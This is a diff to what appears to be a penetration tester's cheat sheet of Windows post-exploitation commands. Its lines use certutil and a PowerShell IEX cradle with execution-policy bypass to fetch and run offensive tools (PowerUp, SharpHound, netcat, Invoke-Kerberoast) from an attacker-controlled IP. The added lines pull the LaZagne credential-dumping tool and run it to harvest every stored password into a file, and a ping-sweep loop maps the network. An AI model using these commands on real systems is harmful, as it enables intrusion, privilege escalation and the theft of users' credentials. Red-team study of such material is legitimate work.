@@ -350,11 +350,18 @@ certutil -urlcache -split -f http://192.168.162.46:80/PowerUp.ps1
 certutil -urlcache -split -f http://192.168.162.46:80/SharpHound.exe  
 certutil -urlcache -split -f http://192.168.162.46:80/nc.exe 
 certutil -urlcache -split -f http://192.168.162.46:80/Invoke-Kerberoast.ps1  
- 
+certutil -urlcache -split -f http://192.168.162.46:80/lazagne.exe   ..try this out
+
 Powershell
 powershell.exe -nop -ExecutionPolicy bypass  
 IEX(New-Object Net.WebClient).downloadString('http://192.168.162.46:80/PowerUp.ps1') 
- 
+
+==================================
+LaZagne - Cred Search
+https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
+laZagne.exe all
+laZagne.exe all -oA -output C:\Users\test\Desktop
+
  
 ================================== 
 Quick-Paste-Report
@@ -500,6 +507,7 @@ Analysis > Find Shortest Path to Domain Admins
 Ping for Nearby Machines: 
  
 for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.200.%i > nul && echo 192.168.200.%i is up  
+
 
 
 ================================== 
